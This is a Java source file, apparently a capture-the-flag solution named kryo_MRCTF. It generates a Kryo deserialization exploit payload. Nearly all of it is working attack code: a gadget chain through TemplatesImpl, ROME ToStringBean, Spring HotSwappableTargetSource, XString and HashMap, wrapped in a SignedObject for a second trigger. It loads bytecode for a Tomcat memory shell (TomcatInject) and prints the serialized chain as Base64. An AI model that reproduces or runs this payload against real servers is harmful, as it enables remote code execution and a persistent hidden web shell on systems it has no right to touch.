package org.exploit;

import com.esotericsoftware.kryo.Kryo;
import com.esotericsoftware.kryo.io.Output;
import com.esotericsoftware.kryo.io.Input;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.Base64;
import java.util.HashMap;

//or LinkedHashSet.readObject
//HashMap.readObject
//HashMap.putVal
//HotSwappableTargetSource.equals
//XString.equals
//ToStringBean.toString
public class kryo_MRCTF {
    private final Kryo kryo;

    public kryo_MRCTF() {
        kryo = new Kryo();
        kryo.setRegistrationRequired(false);
        kryo.setInstantiatorStrategy(new org.objenesis.strategy.StdInstantiatorStrategy());
    }
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TomcatMemshell/TomcatInject.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        TemplatesImpl fakeTemplates = new TemplatesImpl();
        ToStringBean toStringBean = new ToStringBean(Templates.class, fakeTemplates);
        XString xString = new XString(null);
//        xString.equals(toStringBean);
        HotSwappableTargetSource hotSwappableTargetSource_InputObj = new HotSwappableTargetSource(toStringBean);
        HotSwappableTargetSource hotSwappableTargetSource = new HotSwappableTargetSource(xString);
//        hotSwappableTargetSource.equals(hotSwappableTargetSource_InputObj);
        HashMap hashMap = new HashMap();
        hashMap.put(hotSwappableTargetSource_InputObj,"godown");
        hashMap.put(hotSwappableTargetSource,"godown");
        Field toStringBean_objField = ToStringBean.class.getDeclaredField("obj");

        toStringBean_objField.setAccessible(true);
        toStringBean_objField.set(toStringBean, templatesClass);

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(hashMap, kp.getPrivate(), Signature.getInstance("DSA"));

        //二次触发ROME
        SignedObject fakesignedObject = new SignedObject(new HashMap<>(), kp.getPrivate(), Signature.getInstance("DSA"));
        ToStringBean toStringBean2 = new ToStringBean(SignedObject.class, fakesignedObject);
//        xString.equals(toStringBean);
        HotSwappableTargetSource hotSwappableTargetSource_InputObj2 = new HotSwappableTargetSource(toStringBean2);
        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(xString);
//        hotSwappableTargetSource.equals(hotSwappableTargetSource_InputObj);
        HashMap hashMap2 = new HashMap();
        hashMap2.put(hotSwappableTargetSource_InputObj2,"godown");
        hashMap2.put(hotSwappableTargetSource2,"godown");
        Field toStringBean_objField2 = ToStringBean.class.getDeclaredField("obj");

        toStringBean_objField2.setAccessible(true);
        toStringBean_objField2.set(toStringBean2, signedObject);

        kryo_MRCTF kryo_MRCTF = new kryo_MRCTF();
        String ser = kryo_MRCTF.serialize(hashMap2);

        System.out.println(ser);
//        kryo_MRCTF.unserialize(ser);
    }
    public String serialize(Object obj) throws IOException {
        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();
             Output output = new Output(baos)) {
            kryo.writeClassAndObject(output, obj);
            output.close(); // 关闭 Output，确保所有数据写入

            return Base64.getEncoder().encodeToString(baos.toByteArray()); // 转 Base64
        }
    }
    public void unserialize(String base64Str) {
        ByteArrayInputStream bas = new ByteArrayInputStream(Base64.getDecoder().decode(base64Str));
        Input input = new Input(bas);
        this.kryo.readClassAndObject(input);
    }
}